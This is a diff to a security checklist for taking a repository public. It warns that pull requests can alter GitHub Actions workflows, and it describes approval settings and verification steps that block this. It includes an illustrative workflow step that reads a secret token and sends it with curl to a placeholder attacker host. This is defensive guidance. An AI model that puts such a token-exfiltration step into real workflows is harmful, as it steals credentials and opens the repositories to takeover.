@@ -5,21 +5,61 @@ This checklist ensures all security controls are in place before making the Agen
 
 ---
 
+## 🚨 CRITICAL SECURITY VULNERABILITY
+
+### ⚠️ Workflow Tampering Risk
+
+**THE PROBLEM**: When a PR is opened, GitHub Actions runs the **workflow file from the PR branch**, not from the base branch. This means:
+
+```yaml
+# Attacker's PR modifies .github/workflows/ai-first.yml
+- name: Steal token
+  env:
+    GH_TOKEN: ${{ secrets.CROSS_REPO_CODEGEN_TOKEN }}
+  run: |
+    # Remove all security checks
+    # Exfiltrate token
+    curl https://attacker.com/steal?token=$GH_TOKEN
+```
+
+**THE IMPACT**: 
+- ❌ Attacker can modify workflow to bypass ALL security checks (org check, input validation, etc.)
+- ❌ Attacker can exfiltrate the PAT token to their own server
+- ❌ Attacker can delete issues, create malicious PRs in all 3 repositories
+- ❌ All code-based mitigations become worthless
+
+**THE SOLUTION**: Repository setting below is **MANDATORY** and **BLOCKS PUBLIC RELEASE**
+
+---
+
 ## ✅ Critical Security Requirements
 
-### 1. GitHub Actions Settings
+### 1. 🔴 GitHub Actions Settings (BLOCKS PUBLIC RELEASE)
 
 **Path**: `Settings → Actions → General`
 
 - [ ] **Fork pull request workflows from outside collaborators**:
   - Select: ☑️ **Require approval for all outside collaborators**
-  - ⚠️ **CRITICAL**: Without this, external PRs can expose secrets!
+  - 🔴 **CRITICAL - BLOCKS PUBLIC RELEASE**: Without this setting, attackers can modify the workflow in their PR to bypass all security and steal the PAT token!
 
 - [ ] **Workflow permissions**:
   - Select: ⦿ **Read repository contents and packages permissions**
   - Uncheck: ☐ **Allow GitHub Actions to create and approve pull requests**
 
-**Verification**: Create a test PR from a non-Microsoft account and verify workflow doesn't run automatically.
+**Why This is Essential**:
+- This setting ensures workflows from external PRs **do NOT run automatically**
+- A maintainer must **manually review the workflow code** before approving execution
+- Protection happens at GitHub's infrastructure level (cannot be bypassed by code)
+- Secrets are NOT exposed to unapproved workflow runs
+
+**Verification Steps**:
+1. Enable the setting above
+2. Create a test PR from a non-Microsoft account that modifies a `.cs` file
+3. Verify workflow shows "Waiting for approval" and does NOT run
+4. Check that no secrets are accessible to the workflow
+5. Only after manual approval by a maintainer should the workflow execute
+
+**Without this setting**: 🔴 **DO NOT MAKE REPOSITORY PUBLIC** - Token will be compromised immediately!
 
 ---
 
